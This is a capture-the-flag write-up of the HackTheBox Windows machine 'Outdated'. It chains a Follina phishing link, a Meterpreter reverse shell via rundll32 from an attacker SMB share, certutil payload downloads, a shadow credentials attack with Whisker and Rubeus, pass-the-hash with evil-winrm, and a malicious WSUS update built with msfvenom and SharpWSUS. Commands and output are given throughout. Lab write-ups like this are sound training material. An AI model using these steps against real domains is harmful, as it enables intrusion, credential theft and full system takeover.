---
title: "HackTheBox - Outdated"
author: Nasrallah
description: ""
date: 2025-07-17 07:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, medium, wsus, metasploit, cve, rce, mail, smtp]
img_path: /assets/img/hackthebox/machines/outdated
image:
    path: outdated.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

On [Outdated](https://app.hackthebox.com/machines/outdated) we start by exploiting a remote code execution vulnerability in MSDT to get a reverse shell. After that we perform shadow credentials attack to obtain the hash of a user. The latter is part of WSUS administrators group allowing us to deploy an update and get a shell as administrator.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.175
Host is up (0.11s latency).                                                                                                                                                                   
Not shown: 988 filtered tcp ports (no-response)                                                
PORT     STATE SERVICE       VERSION                                                           
25/tcp   open  smtp          hMailServer smtpd                                                 
| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY                                                                                                                                 
53/tcp   open  domain        Simple DNS Plus                                                   
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-11 19:16:13Z)
135/tcp  open  msrpc         Microsoft Windows RPC                                             
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                                                    
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)                                                                  | ssl-cert: Subject: commonName=DC.outdated.htb          
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.outdated.htb                                                                                               
| Not valid before: 2025-07-11T19:02:40                                                                                                                                                       
|_Not valid after:  2026-07-11T19:02:40                                                        
|_ssl-date: 2025-07-11T19:17:36+00:00; +59m59s from scanner time.                              
445/tcp  open  microsoft-ds?                                                                   
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                               
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)                                                                  
|_ssl-date: 2025-07-11T19:17:35+00:00; +59m58s from scanner time.                                                                                                                             
| ssl-cert: Subject: commonName=DC.outdated.htb                                                                                                                                               
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.outdated.htb                                                                                               
| Not valid before: 2025-07-11T19:02:40                                                                                                                                                       
|_Not valid after:  2026-07-11T19:02:40                                                                                                                                                       
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-11T19:17:36+00:00; +59m59s from scanner time.      
| ssl-cert: Subject: commonName=DC.outdated.htb                        
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.outdated.htb                                                               
| Not valid before: 2025-07-11T19:02:40                                                        
|_Not valid after:  2026-07-11T19:02:40     
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-11T19:17:35+00:00; +59m58s from scanner time.         
| ssl-cert: Subject: commonName=DC.outdated.htb                           
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.outdated.htb                                                               
| Not valid before: 2025-07-11T19:02:40                                                        
|_Not valid after:  2026-07-11T19:02:40                                                        
Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-07-11T19:16:57
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 59m58s, deviation: 0s, median: 59m58s
                                                                        
```

The target is a domain controller with the domain `outdated.htb` and `DC.outdated.htb`.

The is a smtp service running with the domain `mail.outdated.htb`. Let's add those to `/etc/hosts` file.

### SMB

Let's start by trying to list shares on the smb server.

```terminal
┌──[10.10.16.18]-[sirius💀parrot]-[25-07-11 19:20]-[~/ctf/htb/outdated]
└──╼[★]$ nxc smb 10.10.11.175 -u 'guest' -p '' --shares
SMB         10.10.11.175    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:outdated.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.175    445    DC               [+] outdated.htb\guest: 
SMB         10.10.11.175    445    DC               [*] Enumerated shares
SMB         10.10.11.175    445    DC               Share           Permissions     Remark
SMB         10.10.11.175    445    DC               -----           -----------     ------
SMB         10.10.11.175    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.175    445    DC               C$                              Default share
SMB         10.10.11.175    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.175    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.175    445    DC               Shares          READ            
SMB         10.10.11.175    445    DC               SYSVOL                          Logon server share 
SMB         10.10.11.175    445    DC               UpdateServicesPackages                 A network share to be used by client systems for collecting all software packages (usually applicat
ions) published on this WSUS system.
SMB         10.10.11.175    445    DC               WsusContent                     A network share to be used by Local Publishing to place published content on this WSUS system.
SMB         10.10.11.175    445    DC               WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.

```

The is a share called `Shares` that we can read.

Let's connect to it and see what's there.

```terminal
┌──[10.10.16.18]-[sirius💀parrot]-[25-07-11 19:20]-[~/ctf/htb/outdated]
└──╼[★]$ smbclient //10.10.11.175/Shares -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jun 20 16:01:33 2022
  ..                                  D        0  Mon Jun 20 16:01:33 2022
  NOC_Reminder.pdf                   AR   106977  Mon Jun 20 16:00:32 2022

                9116415 blocks of size 4096. 1405918 blocks available
smb: \> get NOC_Reminder.pdf
getting file \NOC_Reminder.pdf of size 106977 as NOC_Reminder.pdf (83.2 KiloBytes/sec) (average 83.2 KiloBytes/sec)
```

We find a pdf file.

![pdf](1.png)

The pdf contains some CVEs and also revealing that we can send emails to `itsupport@outdated.htb` with links to websites.

## **Foothold**

### CVE-2022-30190

We'll be exploiting the `CVE-2022-30190` using the following exploit <https://github.com/DarkRelay-Security-Labs/CVE-2022-30190-Follina-exploit>.

I'll use `smb_delivery` module from metasploit to get a shell.

```bash
[msf](Jobs:0 Agents:0) exploit(windows/smb/smb_delivery) >> set lhost tun0
lhost => 10.10.16.18
[msf](Jobs:0 Agents:0) exploit(windows/smb/smb_delivery) >> set srvhost tun0                                                                                                                  
srvhost => 10.10.16.18           
[msf](Jobs:0 Agents:0) exploit(windows/smb/smb_delivery) >> run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 10.10.16.18:4444 
[*] Server is running. Listening on 10.10.16.18:445
[*] Server started.
[*] Run the following command on the target machine:
rundll32.exe \\10.10.16.18\FkWk\test.dll,0
```

We need to run `rundll32.exe \\10.10.16.18\FkWk\test.dll,0` on the target. Let's do that using the exploit.

```bash
[★]$ sudo python follina.py -t docx -m  command -c 'rundll32.exe \\10.10.16.18\FkWk\test.dll,0'
[sudo] password for sirius: 
Generated 'clickme.docx' in current directory
Generated 'exploit.html' in 'www' directory
Serving payload on http://localhost:80/exploit.html
```

Now we send the email.

```bash
swaks --to itsupport@outdated.htb --from sirius@hacker.com --server outdated.htb --data "Subject: Test\n\nCheck this link: http://10.10.16.18/exploit.html"
```

We wait a little bit and a session should pop up on our listener.

```shell
msf](Jobs:1 Agents:0) exploit(windows/smb/smb_delivery) >> 
[SMB] NTLMv2-SSP Client     : 10.10.11.175
[SMB] NTLMv2-SSP Username   : OUTDATED\btables
[SMB] NTLMv2-SSP Hash       : btables::OUTDATED:f19c1bfc237630c1:c5a589a02e877105e09da487b483a6c6:0101000000000000809d563f17f3db01f6ca57135122aa9e000000000200120057004f0052004b00470052004f00550050000100120057004f0052004b00470052004f00550050000400120057004f0052004b00470052004f00550050000300120057004f0052004b00470052004f005500500007000800809d563f17f3db0106000400020000000800300030000000000000000000000000200000517cb30d4852dbd1ce12e67406f2bf4152e2169f91545d9e000d5eb6e921417c0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00310038000000000000000000

[*] Sending stage (177734 bytes) to 10.10.11.175
[*] Meterpreter session 1 opened (10.10.16.18:4444 -> 10.10.11.175:49887) at 2025-07-12 11:25:32 +0100

(Meterpreter 1)(C:\Users\btables\AppData\Local\Temp\SDIAG_6994d5e5-c098-4edb-bfe3-c677d12d7b78) > getuid
Server username: OUTDATED\btables

```

## **Privilege Escalation**

I'll upload a copy of `sharphound.exe` and run it.

```shell
c:\Users\btables\Downloads>.\sharp.exe
.\sharp.exe
2025-07-12T10:34:42.7800390-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2025-07-12T10:34:42.9206716-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
2025-07-12T10:34:42.9362879-07:00|INFORMATION|Initializing SharpHound at 10:34 AM on 7/12/2025
2025-07-12T10:34:43.1848909-07:00|INFORMATION|Resolved current domain to outdated.htb
2025-07-12T10:34:43.3255057-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
2025-07-12T10:34:43.4192572-07:00|INFORMATION|Beginning LDAP search for outdated.htb
2025-07-12T10:34:43.5286255-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OUTDATED.HTB
2025-07-12T10:34:43.6223885-07:00|INFORMATION|Beginning LDAP search for outdated.htb Configuration NC
2025-07-12T10:34:43.6379977-07:00|INFORMATION|Producer has finished, closing LDAP channel
2025-07-12T10:34:43.6536272-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2025-07-12T10:34:43.9069374-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OUTDATED.HTB
2025-07-12T10:34:43.9538118-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OUTDATED.HTB
2025-07-12T10:34:44.3444406-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OUTDATED.HTB
2025-07-12T10:35:13.4040242-07:00|INFORMATION|Status: 308 objects finished (+308 10.62069)/s -- Using 40 MB RAM
2025-07-12T10:35:43.4072491-07:00|INFORMATION|Status: 308 objects finished (+0 5.220339)/s -- Using 40 MB RAM
2025-07-12T10:36:09.0984695-07:00|INFORMATION|Consumers finished, closing output channel
2025-07-12T10:36:09.1140720-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2025-07-12T10:36:09.2859525-07:00|INFORMATION|Status: 342 objects finished (+34 4.02353)/s -- Using 41 MB RAM
2025-07-12T10:36:09.2859525-07:00|INFORMATION|Enumeration finished in 00:01:25.8794443
2025-07-12T10:36:09.3797066-07:00|INFORMATION|Saving cache with stats: 20 ID to type mappings.
 1 name to SID mappings.
 2 machine sid mappings.
 4 sid to domain mappings.
 0 global catalog mappings.
2025-07-12T10:36:09.3953511-07:00|INFORMATION|SharpHound Enumeration Completed at 10:36 AM on 7/12/2025! Happy Graphing!
```

Let's transfer to file to our machine and load it on bloodhound.

![blood](2.png)

Our user has `AddKeyCredentialLink` over `sflowers` which can lead to a shadow credentials attack.

Let's upload a copy of `whisker.exe` to the target

```shell
c:\Users\btables\Documents>certutil -urlcache -f http://10.10.16.18/windows/Whisker.exe Whisker.exe
certutil -urlcache -f http://10.10.16.18/windows/Whisker.exe Whisker.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

c:\Users\btables\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9EA0-5B4E

 Directory of c:\Users\btables\Documents

07/12/2025  10:44 AM    <DIR>          .
07/12/2025  10:44 AM    <DIR>          ..
07/12/2025  10:44 AM            44,544 Whisker.exe
```

Now we run the following command.

```shell
c:\Users\btables\Documents>Whisker.exe add /target:sflowers /password:siriussirius /path:cert.pfx
Whisker.exe add /target:sflowers /password:siriussirius /path:cert.pfx                
[*] Searching for the target account                                                           
[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb                   
[*] Generating certificate                                                                     
[*] Certificate generaged                                                                      
[*] Generating KeyCredential                                                                   
[*] KeyCredential generated with DeviceID d9e6ad6e-7cf6-49a5-a02c-09dd438c3235        
[*] Updating the msDS-KeyCredentialLink attribute of the target object                
[+] Updated the msDS-KeyCredentialLink attribute of the target object                 
[*] Saving the associated certificate to file...                                      
[*] The associated certificate was saved to cert.pfx                                  
[*] You can now run Rubeus with the following syntax:                                 
                                                                                               
Rubeus.exe asktgt /user:sflowers /certificate:cert.pfx /password:"siriussirius" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
```

`Whisker` gave us another command to run with `rubeus.exe`, let's upload the tools and run the command.

```shell
c:\Users\btables\Documents>Rubeus.exe asktgt /user:sflowers /certificate:cert.pfx /password:"siriussirius" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
Rubeus.exe asktgt /user:sflowers /certificate:cert.pfx /password:"siriussirius" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=sflowers 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'outdated.htb\sflowers'
[*] Using domain controller: 172.16.20.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):


      doIF0jCCBc6gAwIBBaEDAgEWooIE5zCCBONhggTfMIIE26ADAgEFoQ4bDE9VVERBVEVELkhUQqIhMB+g
      AwIBAqEYMBYbBmtyYnRndBsMb3V0ZGF0ZWQuaHRio4IEnzCCBJugAwIBEqEDAgECooIEjQSCBInoqgbo
      4nrQu6MIGzLjJDwkvgKbpXNjIX2U/IpcooPj3ACRxSMO8W8gBDgAqkJZhoZCYo1Qq0gZgCBJhIWpDIiB
      R/+sxREEgqXScacQwDJt2BI0Gu/8Wrg6zcEh4fyk/5TQzeCYm/4qSfzi73j15zUCF4wmP4d52Al+uiH5
      lROxjrC+8+H3S0ytN37E5bCcYWyFzYgAPGIv8rrkixRcE7HjXkx85uG0ZB37aGYJXV74bY6GxgZBl6tg
      O2QDAj/beCc8tNYILcCDmkvanqtyD8WzSeYiqMR3KkhG8m91aP/gtNe7+8y1YQ+wqxctQCDrOWRsmL2E
      4bG/xqOfsmkKyUPmuXCMicky3G5fTBYY1Lq83MrDLpopwcUQjZZ7wO94+VRt4jA8XkRBU7L5Ctv0+glI
      zBj9ahsXX8i/zkUZA9AxRUjw7BfVQnLyFUpoyEE1PRq8bTKFpNy9t/0p5fjSSziGeEyIi7zd9do/OCpz
      AYzuKKaFeUWGuhJYt9pN1s5+6O6ilOwNbyZ0VSVdbnQ+1QTjaZ07tixc9n9eHulwmcchsHBeV7f1XtOX
      byE7I0Ws+rYM/9fe+q9d6Y3aAyavmtmaSushQI8+Iadb21deJaw8/PtgswOg8f6oBHACxCUFzhV97oUQ
      p+yEX8wIQMkFhw+LbinEmZIaVgz975zW1mMDaRNo0Zq+BD1BQ22xnqP4/gve1XGE8wtW+JkegZuSXBxm
      myNhLdgCeGFEVBL6P/UXvsZvV8IHXG2NmzIOovvn7k4ITOKcQzvUkbxIAM4xHYgy8OK2P2d5+Puz3BSq
      IQz5ohzdaN9qOMVoLb4Y6p8WiQebMDeFRLn2fjEq/fdv8JtcxXvR1HWHI0WE90g1Re7oWMaz5dy0KzO4
      ye70NF2wOCD7HM3M26CBPNWpGrQdiHbTYAbKbo2HROAFaZFzShN8Bzbnhcf4RkyW1YUeHnryyJjKYWG0
      6yweiDfZD/1USD0GuJWmSfxDvD5xv3oIO0recDWxSxQGDvjuuPrz32SpEF8psB/N97cJn1EFbAmQDLgJ
      Vmftq3vPUxAdGopXpf1lN8j4Z5TyzAH62PCXzr3AJuiZgDQmFveTnkvEYa5ohOpEFJR+ffFQG/ovaQuR
      q84+ZsWOwtQyS1QL5SJYmlec35N/5Y50PmlEelWBhwWy0WuNBbC3+x77cf3e7Q7ph0ed9yqmzqDxI7PH
      cgi1nGU05HLIK52iH4HjfagQiwAx/0lvKNCjvg6GCBxf9FmZM25EPQBzGbJCsVqkNPAQfw70+Dwami9r
      VsJ9QWZJmohieQvBtlUP2QhEyus5MXBy+nny9efC3f8zc4LBdQ9aeYP8RoLBmpRkaMPiiZdct6pvs06q
      EOioAseSnuzWEax5rwd1yxpzXItM/QeIU59k3bcyF2dLyfTkh5Mo7na3QjiWYr4HkDHNQ0bYZmU+i+84
      2MGv2uFfo0sFnVasp7kCkCGd1SaGsFnWkjQsZ2aRSV/jd5v/7hZrehHGg3nNhVMN26NqkvCjRZFRZUUX
      MMx0GJEc9HTiq0GrsVfE27SjgdYwgdOgAwIBAKKBywSByH2BxTCBwqCBvzCBvDCBuaAbMBmgAwIBF6ES
      BBC80zCJ0vCs3qvZ/bEDAOmUoQ4bDE9VVERBVEVELkhUQqIVMBOgAwIBAaEMMAobCHNmbG93ZXJzowcD
      BQBA4QAApREYDzIwMjUwNzEyMTc0NjU0WqYRGA8yMDI1MDcxMzAzNDY1NFqnERgPMjAyNTA3MTkxNzQ2
      NTRaqA4bDE9VVERBVEVELkhUQqkhMB+gAwIBAqEYMBYbBmtyYnRndBsMb3V0ZGF0ZWQuaHRi

  ServiceName              :  krbtgt/outdated.htb
  ServiceRealm             :  OUTDATED.HTB
  UserName                 :  sflowers
  UserRealm                :  OUTDATED.HTB
  StartTime                :  7/12/2025 10:46:54 AM
  EndTime                  :  7/12/2025 8:46:54 PM
  RenewTill                :  7/19/2025 10:46:54 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  vNMwidLwrN6r2f2xAwDplA==
  ASREP (key)              :  825046E894BD2F618864E3F16A78175A

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 1FCDB1F6015DCB318CC77BB2BDA14DB5

```

Great! We got the ntlm hash of use `sflowers`.

Checking the user's info we see that's they are part of the `Remote Management Users` which means we can winrm.

```terminal
c:\Users\btables\Documents>net user sflowers /dom
net user sflowers /dom
The request will be processed at a domain controller for domain outdated.htb.

User name                    sflowers
Full Name                    Susan Flowers
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/20/2022 11:04:09 AM
Password expires             Never
Password changeable          6/21/2022 11:04:09 AM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   7/12/2025 10:46:54 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*WSUS Administrators  
Global Group memberships     *Domain Users         
The command completed successfully.

```

```terminal
[★]$ evil-winrm -i outdated.htb -u sflowers -H 1FCDB1F6015DCB318CC77BB2BDA14DB5
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sflowers\Documents>
```

### Administrator

We can also see that this user is part of a group called `WSUS Administrators`

>WSUS is a Microsoft solution for administrators to deploy Microsoft product updates and patches across an environment in a scalable manner, using a method where the internal servers do not need to reach out to the internet directly. WSUS is extremely common within Windows corporate environments.
{: .prompt-info }

The following article explain in details how the exploit the WSUS <https://www.lrqa.com/en/cyber-labs/introducing-sharpwsus/>

First I'll generate a reverse shell with `msfvenom`

```terminal
─╼[★]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.18 LPORT=9001 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

I'll upload the shell.exe and a copy of [SharpWSUS.exe](https://github.com/twisted007/Compiled_Windows_Binaries/blob/main/SharpWSUS.exe) to the target.

No we need to create an update that's will execute our shell.exe file.

```terminal
*Evil-WinRM* PS C:\Users\sflowers\Documents> .\SharpWSUS.exe create /payload:"C:\Users\sflowers\Desktop\PsExec64.exe" /args:"-accepteula -s -d C:\Users\sflowers\Documents\shell.exe" /title:"
shell"

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Create Update
[*] Creating patch to use the following:
[*] Payload: PsExec64.exe
[*] Payload Path: C:\Users\sflowers\Desktop\PsExec64.exe
[*] Arguments: -accepteula -s -d C:\Users\sflowers\Documents\shell.exe
[*] Arguments (HTML Encoded): -accepteula -s -d C:\Users\sflowers\Documents\shell.exe

################# WSUS Server Enumeration via SQL ##################
ServerName, WSUSPortNumber, WSUSContentLocation 
----------------------------------------------- 
DC, 8530, c:\WSUS\WsusContent

ImportUpdate
Update Revision ID: 38
PrepareXMLtoClient
InjectURL2Download
DeploymentRevision
PrepareBundle
PrepareBundle Revision ID: 39
PrepareXMLBundletoClient
DeploymentRevision

[*] Update created - When ready to deploy use the following command:
[*] SharpWSUS.exe approve /updateid:11426374-9968-4208-a81e-6a9a5292bbc3 /computername:Target.FQDN /groupname:"Group Name"

[*] SharpWSUS.exe check /updateid:11426374-9968-4208-a81e-6a9a5292bbc3 /computername:Target.FQDN

[*] To delete the update use the following command:
[*] SharpWSUS.exe delete /updateid:11426374-9968-4208-a81e-6a9a5292bbc3 /computername:Target.FQDN /groupname:"Group Name"

[*] Create complete

```

Now I'll setup a `multi/handler` on metasploit and deploy the upldate

```terminal
*Evil-WinRM* PS C:\Users\sflowers\Documents> .\SharpWSUS.exe approve /updateid:11426374-9968-4208-a81e-6a9a5292bbc3 /computername:dc.outdated.htb /groupname:"Update"

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Approve Update

Targeting dc.outdated.htb
TargetComputer, ComputerID, TargetID
------------------------------------
dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
Group Exists = False
Group Created: Update
Added Computer To Group
Approved Update

[*] Approve complete

```

```terminal
[msf](Jobs:1 Agents:0) exploit(multi/handler) >> set lhost tun0
lhost => 10.10.16.18
[msf](Jobs:1 Agents:0) exploit(multi/handler) >> set lport 9001
lport => 9001
[msf](Jobs:1 Agents:0) exploit(multi/handler) >> set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:1 Agents:0) exploit(multi/handler) >> 
[msf](Jobs:1 Agents:0) exploit(multi/handler) >> run
[*] Started reverse TCP handler on 10.10.16.18:9001 
[*] Sending stage (203846 bytes) to 10.10.11.175
[*] Meterpreter session 2 opened (10.10.16.18:9001 -> 10.10.11.175:64357) at 2025-07-12 13:03:02 +0100

(Meterpreter 2)(C:\Windows\system32) > getuid
Server username: NT AUTHORITY\SYSTEM

```

## **References**

<https://www.lrqa.com/en/cyber-labs/introducing-sharpwsus/>

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
